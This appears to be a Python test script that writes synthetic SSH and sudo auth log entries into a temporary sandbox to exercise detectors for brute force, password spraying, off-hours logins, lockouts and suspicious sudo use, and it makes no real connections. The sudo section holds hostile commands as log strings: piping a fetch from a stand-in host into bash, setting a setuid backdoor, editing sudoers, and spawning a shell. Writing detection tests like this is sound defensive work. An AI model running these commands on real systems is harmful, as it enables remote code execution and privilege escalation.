#!/usr/bin/env python3
"""Trigger Pack: AuthGuard — Exercise 5 silent authentication probes.

Targeted probes:
    1. SSHBruteForceProbe — rapid failed SSH attempts
    2. SSHPasswordSprayProbe — multiple usernames from same source
    3. SudoSuspiciousCommandProbe — dangerous sudo commands
    4. OffHoursLoginProbe — login outside business hours
    5. AccountLockoutStormProbe — mass account lockout

NOTE: Auth triggers are log-injection based. They create synthetic auth log
entries that the AuthGuard agent can parse. No actual authentication attempts
are made (no real SSH connections to other hosts).

Run with --dry-run to preview without executing.
"""

from __future__ import annotations

import argparse
import os
import shutil
import time

SANDBOX = "/tmp/eoa_auth_sandbox"
AUTH_LOG = f"{SANDBOX}/auth.log"


def log(msg: str) -> None:
    print(f"  [AUTH] {msg}")


def setup_sandbox() -> None:
    os.makedirs(SANDBOX, exist_ok=True)
    log(f"Sandbox created: {SANDBOX}")


def cleanup_sandbox() -> None:
    if os.path.exists(SANDBOX):
        shutil.rmtree(SANDBOX, ignore_errors=True)
        log(f"Sandbox cleaned: {SANDBOX}")


def _write_log_entries(entries: list[str], dry_run: bool = False) -> None:
    """Append synthetic auth log entries."""
    if dry_run:
        for entry in entries[:3]:
            log(f"  [DRY-RUN] Would log: {entry[:80]}...")
        if len(entries) > 3:
            log(f"  [DRY-RUN] ... and {len(entries) - 3} more entries")
        return

    with open(AUTH_LOG, "a") as f:
        for entry in entries:
            f.write(entry + "\n")
    log(f"  Wrote {len(entries)} log entries to {AUTH_LOG}")


# ── Trigger 1: SSHBruteForceProbe ─────────────────────────────────────────


def trigger_ssh_brute_force(dry_run: bool = False) -> None:
    """Generate 6 SSH failure entries from same IP→user (threshold is 5)."""
    log("Trigger: SSHBruteForceProbe")

    ts = time.strftime("%b %d %H:%M:%S")
    entries = [
        f"{ts} eoa-host sshd[{10000+i}]: Failed password for admin from 10.99.99.99 port {50000+i} ssh2"
        for i in range(6)
    ]
    _write_log_entries(entries, dry_run)


# ── Trigger 2: SSHPasswordSprayProbe ──────────────────────────────────────


def trigger_password_spray(dry_run: bool = False) -> None:
    """Generate failures against 12 distinct usernames from same IP."""
    log("Trigger: SSHPasswordSprayProbe")

    ts = time.strftime("%b %d %H:%M:%S")
    users = [
        "root",
        "admin",
        "deploy",
        "ubuntu",
        "ec2-user",
        "centos",
        "oracle",
        "postgres",
        "mysql",
        "jenkins",
        "git",
        "www-data",
    ]
    entries = [
        f"{ts} eoa-host sshd[{20000+i}]: Failed password for {user} from 10.88.88.88 port {60000+i} ssh2"
        for i, user in enumerate(users)
    ]
    _write_log_entries(entries, dry_run)


# ── Trigger 3: SudoSuspiciousCommandProbe ─────────────────────────────────


def trigger_sudo_suspicious(dry_run: bool = False) -> None:
    """Generate sudo entries with dangerous command patterns."""
    log("Trigger: SudoSuspiciousCommandProbe")

    ts = time.strftime("%b %d %H:%M:%S")
    entries = [
        f"{ts} eoa-host sudo: eoa_user : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://evil.test | bash'",
        f"{ts} eoa-host sudo: eoa_user : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/chmod 4777 /tmp/backdoor",
        f"{ts} eoa-host sudo: eoa_user : TTY=pts/0 ; PWD=/etc ; USER=root ; COMMAND=/usr/sbin/visudo -f /etc/sudoers",
        f"{ts} eoa-host sudo: eoa_user : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    ]
    _write_log_entries(entries, dry_run)


# ── Trigger 4: OffHoursLoginProbe ─────────────────────────────────────────


def trigger_off_hours_login(dry_run: bool = False) -> None:
    """Generate login entries timestamped at 3 AM (off-hours)."""
    log("Trigger: OffHoursLoginProbe")

    date_str = time.strftime("%b %d")
    entries = [
        f"{date_str} 03:15:22 eoa-host sshd[30001]: Accepted publickey for developer from 10.0.0.100 port 55555 ssh2",
        f"{date_str} 03:17:45 eoa-host login[30002]: LOGIN ON pts/1 BY developer FROM 10.0.0.100",
    ]
    _write_log_entries(entries, dry_run)


# ── Trigger 5: AccountLockoutStormProbe ───────────────────────────────────


def trigger_account_lockout(dry_run: bool = False) -> None:
    """Generate 6 account lockout entries (threshold is 5)."""
    log("Trigger: AccountLockoutStormProbe")

    ts = time.strftime("%b %d %H:%M:%S")
    accounts = ["alice", "bob", "carol", "dave", "eve", "frank"]
    entries = [
        f"{ts} eoa-host pam_tally2[{40000+i}]: account {acct} locked after 5 failed attempts from 10.77.77.77"
        for i, acct in enumerate(accounts)
    ]
    _write_log_entries(entries, dry_run)


def main() -> None:
    parser = argparse.ArgumentParser(description="Trigger Pack: AuthGuard probes")
    parser.add_argument(
        "--dry-run", action="store_true", help="Preview without executing"
    )
    args = parser.parse_args()

    print("\n═══ AuthGuard Trigger Pack ═══")
    setup_sandbox()

    try:
        trigger_ssh_brute_force(args.dry_run)
        trigger_password_spray(args.dry_run)
        trigger_sudo_suspicious(args.dry_run)
        trigger_off_hours_login(args.dry_run)
        trigger_account_lockout(args.dry_run)
    finally:
        cleanup_sandbox()

    print("═══ AuthGuard triggers complete ═══\n")


if __name__ == "__main__":
    main()
